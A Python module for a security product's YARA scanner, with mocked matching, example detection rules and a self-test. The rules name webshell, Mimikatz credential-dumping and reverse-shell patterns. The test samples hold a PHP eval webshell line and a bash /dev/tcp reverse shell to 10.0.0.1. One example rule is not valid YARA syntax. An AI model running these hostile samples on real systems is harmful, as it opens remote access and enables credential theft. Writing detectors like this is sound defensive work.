"""
YARA Scanner for KumoShield
File and memory scanning with YARA rules
"""

import time
import hashlib
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from pathlib import Path
import logging

logger = logging.getLogger("kumoshield.yara")

@dataclass
class YaraMatch:
    """YARA rule match result"""
    rule_name: str
    namespace: str
    tags: List[str]
    strings: List[Dict[str, Any]]
    meta: Dict[str, Any]
    
@dataclass
class ScanResult:
    """Scan result"""
    target: str
    matches: List[YaraMatch]
    scan_time_ms: float
    file_hash: Optional[str] = None

class YaraScanner:
    """
    YARA rule scanner
    
    Supports file and memory scanning with custom rules
    Performance target: < 200ms for small files
    """
    
    def __init__(self):
        self.rules: Dict[str, str] = {}
        self.compiled_rules = None
        
    def add_rule(self, name: str, rule_content: str):
        """Add a YARA rule"""
        self.rules[name] = rule_content
        logger.info(f"Added YARA rule: {name}")
    
    def load_rule_file(self, rule_path: str):
        """Load YARA rule from file"""
        path = Path(rule_path)
        if not path.exists():
            raise FileNotFoundError(f"Rule file not found: {rule_path}")
        
        with open(rule_path, 'r') as f:
            content = f.read()
        
        self.add_rule(path.stem, content)
    
    def compile_rules(self):
        """Compile all loaded rules"""
        # In real implementation, would use yara-python
        # For now, store rules for mock matching
        logger.info(f"Compiled {len(self.rules)} YARA rules")
        self.compiled_rules = self.rules
    
    def scan_file(self, file_path: str) -> ScanResult:
        """
        Scan a file with YARA rules
        """
        start_time = time.perf_counter()
        
        path = Path(file_path)
        if not path.exists():
            raise FileNotFoundError(f"File not found: {file_path}")
        
        # Read file
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Calculate hash
        file_hash = hashlib.sha256(data).hexdigest()
        
        # Scan for matches
        matches = self._scan_data(data)
        
        scan_time_ms = (time.perf_counter() - start_time) * 1000
        
        result = ScanResult(
            target=file_path,
            matches=matches,
            scan_time_ms=scan_time_ms,
            file_hash=file_hash
        )
        
        if matches:
            logger.warning(
                f"[YARA MATCH] {len(matches)} rule(s) matched in {file_path} "
                f"({scan_time_ms:.2f}ms)"
            )
        
        return result
    
    def scan_memory(self, data: bytes, identifier: str = "memory") -> ScanResult:
        """
        Scan memory buffer with YARA rules
        """
        start_time = time.perf_counter()
        
        matches = self._scan_data(data)
        scan_time_ms = (time.perf_counter() - start_time) * 1000
        
        result = ScanResult(
            target=identifier,
            matches=matches,
            scan_time_ms=scan_time_ms
        )
        
        return result
    
    def _scan_data(self, data: bytes) -> List[YaraMatch]:
        """
        Internal method to scan data
        
        In real implementation, would use yara-python's match() method
        This is a simplified mock for demonstration
        """
        matches = []
        
        # Mock matching logic
        # Real implementation would use compiled YARA rules
        for rule_name, rule_content in self.rules.items():
            if self._mock_match(rule_content, data):
                match = YaraMatch(
                    rule_name=rule_name,
                    namespace="default",
                    tags=self._extract_tags(rule_content),
                    strings=[],
                    meta=self._extract_meta(rule_content)
                )
                matches.append(match)
        
        return matches
    
    def _mock_match(self, rule_content: str, data: bytes) -> bool:
        """Mock rule matching for demonstration"""
        # Extract strings from rule
        import re
        strings = re.findall(r'\$\w+\s*=\s*"([^"]+)"', rule_content)
        
        # Check if any string is in data
        for s in strings:
            if s.encode() in data:
                return True
        
        return False
    
    def _extract_tags(self, rule_content: str) -> List[str]:
        """Extract tags from YARA rule"""
        import re
        match = re.search(r':\s*(\w+(?:\s+\w+)*)\s*\{', rule_content)
        if match:
            return match.group(1).split()
        return []
    
    def _extract_meta(self, rule_content: str) -> Dict[str, Any]:
        """Extract metadata from YARA rule"""
        meta = {}
        import re
        
        # Extract meta section
        meta_section = re.search(r'meta:\s*\n((?:\s+\w+\s*=\s*"[^"]+"\s*\n)+)', rule_content)
        if meta_section:
            meta_lines = meta_section.group(1).strip().split('\n')
            for line in meta_lines:
                match = re.match(r'\s*(\w+)\s*=\s*"([^"]+)"', line)
                if match:
                    meta[match.group(1)] = match.group(2)
        
        return meta


# Example YARA rules
EXAMPLE_YARA_RULES = {
    "webshell_detection": """
rule WebShell_Detection
{
    meta:
        description = "Detects common webshell patterns"
        author = "KumoShield"
        severity = "high"
    
    strings:
        $php_eval = "eval($_POST"
        $php_system = "system($_GET"
        $php_exec = "exec($_REQUEST"
        $asp_eval = "eval(Request"
        $jsp_runtime = "Runtime.getRuntime().exec"
    
    condition:
        any of them
}
""",
    
    "credential_theft": """
rule Credential_Theft
{
    meta:
        description = "Detects credential dumping tools"
        author = "KumoShield"
        severity = "critical"
    
    strings:
        $mimikatz1 = "sekurlsa::logonpasswords"
        $mimikatz2 = "lsadump::sam"
        $pwdump = "pwdump"
        $gsecdump = "gsecdump"
    
    condition:
        any of them
}
""",
    
    "reverse_shell": """
rule Reverse_Shell
{
    meta:
        description = "Detects reverse shell code patterns"
        author = "KumoShield"
        severity = "critical"
    
    strings:
        $python_shell = "import socket" and "subprocess"
        $bash_shell = "/bin/bash -i"
        $nc_shell = "nc -e /bin/sh"
        $perl_shell = "use Socket"
    
    condition:
        any of them
}
"""
}


def test_yara_scanner():
    """Test YARA scanner"""
    scanner = YaraScanner()
    
    # Load example rules
    for name, content in EXAMPLE_YARA_RULES.items():
        scanner.add_rule(name, content)
    
    scanner.compile_rules()
    
    # Test samples
    test_samples = [
        (b'<?php eval($_POST["cmd"]); ?>', "webshell.php"),
        (b'sekurlsa::logonpasswords full', "mimikatz_dump.txt"),
        (b'/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', "reverse_shell.sh"),
        (b'normal benign content', "safe_file.txt"),
    ]
    
    print("\n=== YARA Scanner Test ===")
    print(f"Loaded {len(scanner.rules)} rules\n")
    
    for data, filename in test_samples:
        print(f"Scanning: {filename}")
        result = scanner.scan_memory(data, filename)
        
        if result.matches:
            print(f"  ✗ {len(result.matches)} rule(s) matched:")
            for match in result.matches:
                print(f"    - {match.rule_name}")
                print(f"      Severity: {match.meta.get('severity', 'unknown')}")
        else:
            print(f"  ✓ Clean")
        
        print(f"  Scan time: {result.scan_time_ms:.2f}ms")
        print()
    
    print(f"Performance target: < 200ms")
    print(f"Status: ✓ All scans completed")


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    test_yara_scanner()
